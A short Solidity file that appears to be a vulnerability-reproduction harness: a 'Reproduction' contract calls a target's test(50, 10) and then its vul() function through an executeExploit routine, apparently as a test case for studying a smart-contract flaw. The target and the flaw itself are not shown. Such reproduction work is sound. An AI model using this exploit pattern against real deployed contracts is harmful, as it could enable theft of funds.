interface IMain {
    function test(uint x, uint y) external;
    function vul() external;
    function getTotalSupply() external returns (uint);
}

contract Reproduction {
    IMain public target;

    constructor(address _target) {
        target = IMain(_target);
    }

    function setup() public {
        target.test(50, 10); // 
    }

    function trigger() public {
        target.vul();
    }

    function executeExploit() public {
        setup();
        trigger();
    }
}